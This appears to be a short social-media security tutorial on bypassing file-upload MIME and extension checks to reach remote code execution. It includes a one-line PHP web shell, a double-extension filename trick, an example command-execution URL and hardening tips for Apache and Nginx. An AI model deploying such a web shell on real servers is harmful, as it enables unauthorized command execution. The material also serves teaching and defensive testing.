## 🧠 Unsafe File Upload → MIME Type Bypass

### 📂 From innocent upload… to full Remote Code Execution 💥

### ⚠️ Attack Flow:

1. Application only checks `Content-Type` header or file extension (common misconfiguration)
2. Attacker uploads `shell.php.jpg` — appears as an image, but hides PHP code
3. Server accepts it (no deep content inspection)
4. File lands in a web-accessible path and is executed by PHP interpreter

---

### 🛠 Payload Example:

```php
<?php system($_GET["cmd"]); ?>
```

Upload it as:

```txt
shell.php.jpg
```

Access it via:

```url
https://target.com/uploads/shell.php.jpg?cmd=id
```

If the web server (Apache/Nginx) interprets `.php` before `.jpg`, you've triggered code execution. ✅

---

### 🔒 Hardening Tips:

* Use deep content inspection (validate real file MIME type)
* Strip or sanitize file extensions before saving
* Store uploaded files outside of web root
* Disable execution in upload directories:

  * Apache: `.htaccess` with `php_flag engine off`
  * Nginx: `location /uploads/ { deny all; }`

---

### 💡 Real-World Relevance:

Even in 2025, unsafe upload flaws are **widespread**.

Escalate from low-severity file upload to **critical RCE** in a single click.

---

🚀 Follow **@cybersecplayground** for hands-on exploits, recon tricks, and advanced web hacking tutorials.

💡 All tips & tricks: [GitHub - cybersecplayground](https://github.com/cybersecplayground)

💬 Like + 🔁 Share if you've ever dropped a shell via image upload!

---

\#bugbounty #cybersecplayground #fileupload #infosec #rce #websecurity #pentesting
